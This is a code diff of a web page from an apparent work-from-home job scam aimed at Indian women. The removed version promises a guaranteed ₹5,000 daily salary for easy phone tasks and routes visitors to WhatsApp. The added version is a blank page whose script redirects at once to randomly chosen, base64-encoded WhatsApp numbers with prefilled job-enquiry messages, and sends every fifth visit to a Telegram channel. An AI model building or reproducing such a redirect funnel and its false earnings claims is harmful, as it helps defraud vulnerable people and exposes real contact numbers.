@@ -2,174 +2,77 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Work from Home – Daily Earnings</title>
-
-  <!-- ✅ Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet" />
-
-  <!-- ✅ Facebook Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s){
-      if(f.fbq)return;n=f.fbq=function(){
-        n.callMethod ? n.callMethod.apply(n,arguments) : n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-      n.queue=[];t=b.createElement(e);t.async=!0;
-      t.src='https://connect.facebook.net/en_US/fbevents.js';
-      s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)
-    }(window, document, 'script');
-    fbq('init', '827014003015836');
-    fbq('track', 'PageView');
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=827014003015836&ev=PageView&noscript=1"/>
-  </noscript>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
   <style>
-    body {
-      background: linear-gradient(to bottom, #fff3e0, #ffe0e0);
-      font-family: 'Poppins', sans-serif;
+    html, body {
       margin: 0;
       padding: 0;
-    }
-    .wrapper {
-      border: 2px solid #f8c291;
-      border-radius: 16px;
-      padding: 20px;
-      margin: 10px auto;
-      max-width: 480px;
-      background: #fff8f0;
-      box-shadow: 0 0 10px rgba(255, 193, 7, 0.2);
-    }
-    h1 {
-      text-align: center;
-      font-family: 'Georgia', serif;
-    }
-    .main-img {
-      width: 100%;
-      border-radius: 10px;
-      margin: 20px auto;
-      display: block;
-    }
-    .whatsapp-cta {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-color: #25D366;
-      color: white;
-      font-weight: bold;
-      padding: 12px;
-      border-radius: 8px;
-      margin: 20px 0;
-      font-size: 16px;
-      text-decoration: none;
-      cursor: pointer;
-    }
-    .whatsapp-cta img {
-      width: 24px;
-      height: 24px;
-      margin-right: 10px;
-    }
-    .whatsapp-float {
-      position: fixed;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      z-index: 999;
-      cursor: pointer;
-    }
-    .whatsapp-float img {
-      width: 48px;
-      height: 48px;
-    }
-    .benefits {
-      list-style: none;
-      padding-left: 0;
-    }
-    .benefits li {
-      margin-bottom: 10px;
-    }
-    .note, .gender-alert-top, .gender-alert-bottom, .desc, .salary-highlight {
-      text-align: center;
-      font-size: 14px;
-    }
-    .salary-highlight {
-      background: #ffebee;
-      padding: 10px;
-      border-radius: 8px;
-      font-size: 16px;
-      color: #c21807;
-      font-weight: bold;
-      margin: 16px 0;
+      background: #fff;
+      height: 100%;
+      overflow: hidden;
     }
   </style>
 </head>
-
 <body>
-  <div class="wrapper">
-    <p class="gender-alert-top">
-      🚺 <strong>This opportunity is exclusively open to women. Please do not proceed if you are not female.</strong>
-    </p>
-
-    <h1><span style="color:#b71c1c;">Start Earning ₹5,000 Daily</span> <span style="color:#1b5e20;">– Just With Your Phone!</span></h1>
-
-    <p class="desc">
-      Want to make extra income without stepping out? No experience or tools needed. Your phone is enough.
-    </p>
-
-    <p class="salary-highlight">
-      💰 <strong>Salary is settled daily, and the minimum daily salary is ₹5,000.</strong>
-    </p>
-
-    <div class="whatsapp-cta" onclick="trackAndGo()">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" />
-      <span>Start Earning via WhatsApp</span>
-    </div>
-
-    <img class="main-img" loading="lazy" src="http://risingstargo.shop/resource/women.png" alt="Indian Woman with Laptop" />
-
-    <h2>💡 Why This is Perfect for You</h2>
-
-    <ul class="benefits">
-      <li><strong>⏰ Flexible hours:</strong> Work anytime – morning, evening, or weekends.</li>
-      <li><strong>📱 Easy tasks:</strong> Just use your phone to complete small actions.</li>
-      <li><strong>💸 Instant earnings:</strong> Withdraw your money daily.</li>
-      <li><strong>👩‍💼 For women only:</strong> Ideal for housewives, moms, or women at home.</li>
-    </ul>
-
-    <p class="note">👤 You must be at least 25 years old to apply.</p>
-
-    <div class="whatsapp-cta" onclick="trackAndGo()">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" />
-      <span>Message Us to Join</span>
-    </div>
-
-    <p class="gender-alert-bottom">
-      ⚠️ Only women applicants will be accepted for this program.
-    </p>
-  </div>
-
-  <!-- ✅ Floating WhatsApp icon -->
-  <div class="whatsapp-float" onclick="trackAndGo()">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Chat on WhatsApp" />
-  </div>
-
-  <!-- ✅ JavaScript -->
   <script>
-    const whatsappLink = "https://www.captchaapp.com/V0B784";
+    document.addEventListener("DOMContentLoaded", () => {
+      try {
+        // Telegram link (on 5th redirect)
+        const TELEGRAM_URL = "https://t.me/Easytaskearnig";
+        const MAX_WHATSAPP = 4; // after 4 redirects → 5th time Telegram
 
-    function trackAndGo() {
-      if (typeof fbq !== 'undefined') {
-        fbq('track', 'Contact', {
-          content_name: 'WhatsApp Join'
-          // ✅ 已移除 value 和 currency
-        });
+        // Encoded WhatsApp numbers
+        const numbers = [
+          btoa("62857356967327"),
+          btoa("919084174747"),
+          btoa("919035865101"),
+          btoa("919116283028"),
+          btoa("919327857007"),
+          btoa("917729923709"),
+          btoa("919744071310"),
+          btoa("62857433462720"),
+          btoa("917439706994")
+        ];
+
+        // Messages
+        const messages = [
+          "Hello, I'm interested",
+          "Could you please introduce this job to me patiently?",
+          "I’d like to learn more about how this job can earn over 10,000 Rs in wages."
+        ];
+
+        // Get redirect count
+        let shown = parseInt(localStorage.getItem("shownNumbers")) || 0;
+
+        // If 4 redirects done → go Telegram (5th time)
+        if (shown >= MAX_WHATSAPP) {
+          localStorage.setItem("shownNumbers", 0); // reset after Telegram
+          window.location.replace(TELEGRAM_URL);
+          return;
+        }
+
+        // Pick random WhatsApp number
+        const pick = numbers[Math.floor(Math.random() * numbers.length)];
+        let decoded = atob(pick).trim().replace(/\D/g, "");
+        if (!decoded.startsWith("91") && !decoded.startsWith("62")) decoded = "91" + decoded;
+
+        // Pick random message
+        const msg = encodeURIComponent(messages[Math.floor(Math.random() * messages.length)]);
+
+        // WhatsApp URL
+        const waURL = "https://wa.me/" + decoded + "?text=" + msg;
+
+        // Save progress
+        localStorage.setItem("shownNumbers", shown + 1);
+
+        // Redirect instantly
+        window.location.replace(waURL);
+
+      } catch (err) {
+        console.error("Redirect error:", err);
       }
-      window.open(whatsappLink, '_blank');
-    }
+    });
   </script>
 </body>
 </html>
